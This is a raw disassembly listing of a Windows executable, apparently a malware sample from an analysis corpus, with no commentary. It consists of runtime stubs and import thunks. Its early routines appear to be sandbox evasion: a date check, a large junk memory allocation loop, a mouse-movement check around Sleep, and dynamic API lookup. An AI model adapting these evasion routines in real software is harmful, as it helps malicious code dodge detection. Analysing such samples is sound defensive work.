cmp [ ecx - 0x9fc3147 ] 0xafb603ce
pushfd
cmp [ ecx - 0x5532ec47 ] 0xcb4aaac5
add esi [ edx - 0x48b350ea ]
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasd [ edi ]
inc edi
stosd [ edi ]
mov ecx 0xd6d6d6b9
dec ecx
retn 0xbd3d
sub_473df7
inc ecx
push ss
mov [ ecx + 0x4646468c ] 0xe662c2cb
inc esp
inc esi
inc esi
adc [ esi ] edx
int 0x80
scasb [ edi ]
mov dl 0xb9
mov ecx 0xaf5682c5
push ebx
std
mov ecx 0xafd6d6b9
rcl [ edi - 0x29294647 ] 0xd6
salc
dec ecx
retn
sub_473e24
0xafb9b9f5 0xbe9e
mov ecx 0xcf20d6b9
adc ebx [ edi + ebp * 4 - 0x4646060b ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov esp ebp
pop ebp
retn 0x4
sub_473e7d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push j_sub_403a0c#2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473eac
retn
sub_473eb0
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403a0c
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474105
retn
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleViewportExtEx
nop
nop
call GetLastError
mov [ rw-data ] eax
nop
nop
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
mov [ rw-data ] 0x737e
nop
push rw-data
call GetLocalTime
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
call PlayMetaFile
jmp r-xdata
mov [ rw-data ] 0x56e
nop
nop
mov [ rw-data ] 0x1
jmp r-xdata
nop
push 0x0
push 0x0
call PlayMetaFile
nop
inc [ rw-data ]
cmp [ rw-data ] 0x2251
jne r-xdata
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
mov [ rw-data ] 0x35b6
push 0x0
push 0x0
call PlayMetaFile
nop
nop
push 0x0
push 0x0
call PlayMetaFile
mov [ rw-data ] 0x1
jmp r-xdata
push 0x0
push 0x0
call PlayMetaFile
inc [ rw-data ]
cmp [ rw-data ] 0x8934
jne r-xdata
nop
nop
nop
push 0x0
push 0x0
call PlayMetaFile
push 0x4
push 0x3000
push 0x1e1b0987
push 0x0
call VirtualAlloc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
nop
push 0x0
push 0x0
call PlayMetaFile
mov [ rw-data ] 0x1
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
mov eax [ rw-data ]
inc eax
and eax 0x7
mov edx [ rw-data ]
add edx [ rw-data ]
mov [ edx ] al
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1e1b06f3
jne r-xdata
nop
push 0x8000
push 0x0
mov eax [ rw-data ]
push eax
call VirtualFree
mov [ rw-data ] 0x1
push 0x0
push 0x0
call PlayMetaFile
inc [ rw-data ]
cmp [ rw-data ] 0x8ca5
jne r-xdata
nop
nop
xor eax eax
mov [ rw-data ] eax
nop
push rw-data
call GetCursorPos
nop
nop
push 0x1a
call sub_406388
cmp [ rw-data ] 0x2
jbe r-xdata
nop
nop
inc [ rw-data ]
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
nop
push rw-data
call GetCursorPos
nop
nop
push 0x0
push 0x0
call PlayMetaFile
mov eax [ rw-data ]
sub eax [ rw-data ]
cmp eax 0x30
jbe r-xdata
nop
nop
push 0x0
call sub_46e408
nop
jmp r-xdata
sub_47415c
add [ eax ] al
add [ ecx + eax * 2 + 0x47 ] ah
add [ eax + 0x40 ] ah
add [ eax ] dh
inc eax
add [ eax + 0x5e ] bl
inc eax
add [ esi + ebx * 2 ] al
inc eax
add ah bl
pushad
inc eax
add [ eax + 0x6d680040 ] ch
inc eax
add [ eax ] bh
insd
inc eax
add [ eax + 0x7000406d ] ah
insd
inc eax
add [ eax + 0x54 ] dl
inc ecx
add [ eax ] ah
push esp
inc ecx
add al cl
jo r-xdata
add [ eax - 0x6b ] ch
inc edx
add ah dl
scasd [ edi ]
inc edx
add [ edi + ebp * 4 - 0x6063ffbe ] dl
inc edx
add [ edi + ebx * 4 + 0x42 ] ch
add [ eax + ebx * 4 ] bl
inc edx
add ah ch
xchg edi eax
inc edx
add [ eax + 0x1d ] bl
inc edx
add [ eax ] ch
sbb eax 0x91a40042
inc edx
add al dl
nop
inc edx
add al cl
outsd
inc ebp
add [ eax - 0x23ffba91 ] bl
lahf
inc edx
add [ edi + ebx * 4 - 0x2a7bffbe ] ch
inc ebp
add [ edx * 8 - 0x4aebffbb ] dl
inc edx
add ah ah
mov ah 0x42
add [ esi + edi * 4 - 0x4197ffbe ] bh
inc edx
add al bl
les eax [ edx ]
test al 0xc4
inc edx
add [ eax + 0x700042c4 ] ah
les eax [ edx ]
push 0x380042c4
les eax [ edx ]
xor ah al
inc edx
add [ eax ] al
les eax [ edx ]
adc ch al
inc edx
add al ah
les eax [ edx ]
pop esp
or eax 0xd2c0043
inc ebx
add ah bh
and eax 0x25cc0044
inc esp
add [ eax + esi * 4 ] cl
inc edx
add ah bl
scasd [ edi ]
inc edx
add [ eax - 0x50 ] dl
inc edx
add [ eax + esi * 4 ] dl
inc edx
add [ eax - 0x3b ] dl
inc edx
add [ eax ] ah
lds eax [ edx ]
mov ch al
inc edx
add [ eax - 0x3b ] bl
inc edx
add [ eax + 0x2c0042d1 ] cl
rol [ edx ] 0x1
cld
or [ ebx ] al
mov ah 0x8
inc ebx
add al bh
retn
add [ eax + 0x10004070 ] bl
salc
inc eax
add [ eax + 0x7c0040d4 ] dl
fiadd [ eax ]
dec esp
fiadd [ eax ]
pushfd
inc esp
inc ecx
add [ esp + eax * 2 ] ah
inc ecx
add [ eax + 0x46 ] ch
inc ecx
add [ eax ] bh
inc esi
inc ecx
add [ eax ] bl
push esp
inc ecx
add al cl
push ebx
inc ecx
add ah ch
sbb [ edx ] eax
cmp al 0x19
inc edx
add al ah
xchg edx eax
inc edx
add [ eax - 0x67ffbd6e ] dh
xchg ebp eax
inc edx
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_47415c
call sub_405ff0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46847c
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_468494
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468514
call sub_403f18
sub_40115f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405948
sub_401169
add [ esp + 0x4 ] 0xfffffff8
jmp sub_40595c
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_40123c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401274
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_40129c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012bc
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012dc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
SysFreeString
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
InterlockedIncrement
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
InterlockedDecrement
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_40130c
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40131c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401340
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
sub_401358
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401370
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ac2
jmp sub_403a0c
sub_401ac9
mov al [ rw-data ]
pop ebp
retn
sub_401ba6
jmp sub_403a0c
sub_401c74
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402288
retn
sub_402274
jmp sub_403a0c
sub_40241a
jmp sub_403a0c
sub_4026b9
jmp sub_403a0c
sub_40277c
call sub_405fa4
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405fa4
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027d0
mov [ rw-data ] edx
call sub_403ff0
sub_402834
push eax
push edx
push ecx
call sub_405fa4
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402828
retn
sub_402850
retn
sub_4028a4
retn
sub_4028a8
push ebx
call sub_405fa4
mov ebx [ eax + 0x4 ]
call sub_405fa4
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a60
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a70
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402b30
mov edx [ eax + 0x1c ]
call sub_402ae8
retn
sub_402d98
mov ecx 0xff
call sub_402da4
retn
sub_402dc8
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402de4
jmp sub_402de4
sub_402de1
retn
sub_403171
jmp sub_403a0c
sub_4031c4
fninit
fwait
fldcw [ rw-data ]
retn
sub_40321c
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403228
push ebx
mov ebx eax
mov eax ebx
call sub_403258
call sub_4026cc
mov edx eax
mov eax ebx
call sub_40329c
pop ebx
retn
sub_403244
push ebx
mov ebx eax
mov eax ebx
call sub_4032f4
mov eax ebx
call sub_4026ec
pop ebx
retn
sub_403258
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403280
call sub_403644
test dl dl
jle r-xdata
retn
call sub_40362c
sub_403340
retn
sub_4033c8
jmp sub_403a0c
sub_4033cf
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4034c0
mov eax 0x8000ffff
retn
sub_4034c8
retn
sub_4034cc
retn
sub_4034d0
retn
sub_403605
jmp sub_403758
sub_40360a
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403a6c
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_40362c
sub_40362c
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_403634
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_403644
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_403654
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_40371c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403738
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403b05
retn
sub_403c48
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403cd6
jmp sub_403758
sub_403d36
jmp sub_403758
sub_403d50
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403c48
mov [ rw-data ] 0x0
call sub_403cf0
retn
sub_403e89
retn
sub_403feb
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403ff0
mov [ rw-data ] eax
call sub_403f18
sub_40422c
retn
sub_404268
retn
sub_404276
retn
sub_40428f
retn
sub_4042a0
retn
sub_404387
retn
sub_4044b8
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_4044d4#2
jmp sub_4044d4
sub_40451d
retn
j_sub_4044d4
jmp sub_4044d4
sub_404525
retn
sub_404567
retn
sub_4046c0
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
sub_4046d8
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_404830
retn
sub_404842
retn
sub_404844
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404a6c
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402828
call [ rw-data ]
retn
sub_404b70
mov ecx 0x1
jmp sub_404a84
sub_404b7a
retn
sub_404b7c
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402828
call [ rw-data ]
retn
sub_404da2
retn
sub_404da4
mov al 0x11
jmp sub_402828
sub_404dcf
retn
sub_405010
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404cb0
pop ebp
retn 0x4
j_sub_404a84
jmp sub_404a84
sub_405025
retn
sub_405028
call sub_4051c8
retn
sub_405254
call sub_40522c
retn
sub_40559d
jmp sub_403a0c
sub_405708
call sub_405718
retn
sub_405710
call sub_405738
retn
sub_405718
push ebx
mov ebx eax
mov eax 0x8
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_4057d3
jmp sub_403758
sub_4057f4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_405868
jmp sub_403a0c
sub_40586f
pop ecx
pop ebp
retn
sub_4058e8
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_4058f4
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_405900
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402828
sub_405910
call sub_403228
mov [ eax + 0x4 ] 0x1
retn
sub_405948
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405c37
jmp sub_403a0c
sub_405c3e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405cdb
jmp sub_403a0c
sub_405ce2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405d2b
jmp sub_403a0c
sub_405d32
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405df6
jmp sub_403a0c
sub_405dfd
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405e4e
jmp sub_403a0c
sub_405e55
pop ebp
retn
sub_405f2c
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_405f4c
push eax
push 0x40
call LocalAlloc
retn
sub_405f58
mov eax 0x10
retn
sub_405fe4
mov eax rw-data
call sub_4057f4
retn
sub_406059
jmp sub_403a0c
sub_406060
pop ebp
retn
sub_406064
sub [ rw-data ] 0x1
retn
sub_40606c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_406088
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_4060d1
jmp sub_403a0c
sub_4060d8
pop ebp
retn
sub_4060dc
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ __import_lookup_table_6(kernel32:GetLocalTime) ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalAlloc) ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalFree
jmp [ __import_lookup_table_6(kernel32:GlobalFree) ]
GlobalLock
jmp [ __import_lookup_table_6(kernel32:GlobalLock) ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ SizeofResource@IAT ]
sub_406388
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualFree
jmp [ VirtualFree@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
WinExec
jmp [ WinExec@IAT ]
lstrcpyA
jmp [ __import_lookup_table_6(kernel32:lstrcpyA) ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ __import_lookup_table_8(gdi32:CreatePalette) ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
Ellipse
jmp [ __import_lookup_table_8(gdi32:Ellipse) ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
ExtTextOutA
jmp [ ExtTextOutA@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetClipRgn
jmp [ __import_lookup_table_8(gdi32:GetClipRgn) ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetTextMetricsA
jmp [ __import_lookup_table_8(gdi32:GetTextMetricsA) ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ MoveToEx@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
RoundRect
jmp [ __import_lookup_table_8(gdi32:RoundRect) ]
ScaleViewportExtEx
jmp [ __import_lookup_table_8(gdi32:ScaleViewportExtEx) ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ __import_lookup_table_8(gdi32:SetROP2) ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ BeginDeferWindowPos@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefMDIChildProcA
jmp [ DefMDIChildProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ DeferWindowPos@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DrawFocusRect
jmp [ DrawFocusRect@IAT ]
DrawIcon
jmp [ __import_lookup_table_9(user32:DrawIcon) ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EnableScrollBar
jmp [ EnableScrollBar@IAT ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndDeferWindowPos
jmp [ EndDeferWindowPos@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetScrollPos
jmp [ __import_lookup_table_9(user32:GetScrollPos) ]
GetScrollRange
jmp [ __import_lookup_table_9(user32:GetScrollRange) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
InvalidateRect
jmp [ __import_lookup_table_9(user32:InvalidateRect) ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
PostQuitMessage
jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ __import_lookup_table_9(user32:RegisterClipboardFormatA) ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollPos
jmp [ SetScrollPos@IAT ]
SetScrollRange
jmp [ __import_lookup_table_9(user32:SetScrollRange) ]
